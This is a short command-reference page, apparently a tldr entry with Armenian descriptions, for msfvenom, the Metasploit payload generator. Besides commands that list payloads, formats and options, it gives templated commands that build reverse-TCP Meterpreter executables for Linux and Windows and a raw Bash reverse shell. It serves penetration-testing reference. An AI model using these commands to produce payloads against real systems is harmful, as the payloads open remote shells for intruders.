# msfvenom

> Ձեռքով ստեղծեք օգտակար բեռներ metasploit-ի համար:.
> Լրացուցիչ տեղեկություններ. <https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html>:.

- Թվարկեք օգտակար բեռները.:

`msfvenom {{[-l|--list]}} payloads`

- Ցուցակի ձևաչափեր.:

`msfvenom {{[-l|--list]}} formats`

- Ցույց տալ բեռնվածության ընտրանքները.:

`msfvenom {{[-p|--payload]}} {{payload}} --list-options`

- Ստեղծեք ELF երկուական հակադարձ TCP կարգավորիչով.:

`msfvenom {{[-p|--payload]}} linux/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} {{[-f|--format]}} elf {{[-o|--out]}} {{path/to/binary}}`

- Ստեղծեք EXE երկուական հակադարձ TCP կարգավորիչով.:

`msfvenom {{[-p|--payload]}} windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} {{[-f|--format]}} exe {{[-o|--out]}} {{path/to/binary.exe}}`

- Ստեղծեք չմշակված Bash հակադարձ TCP կարգավորիչով.:

`msfvenom {{[-p|--payload]}} cmd/unix/reverse_bash LHOST={{local_ip}} LPORT={{local_port}} {{[-f|--format]}} raw`
